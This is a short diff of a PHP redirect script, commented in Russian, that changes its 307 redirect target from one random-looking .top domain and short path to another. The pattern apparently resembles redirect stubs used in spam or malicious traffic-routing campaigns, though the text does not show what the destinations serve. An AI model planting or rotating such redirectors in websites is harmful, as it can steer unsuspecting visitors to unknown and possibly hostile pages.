@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://buildstudio.top/chgBR9');
+header('Location: https://aahyperpanelstack.top/NvCxw5');
 exit();
 ?>
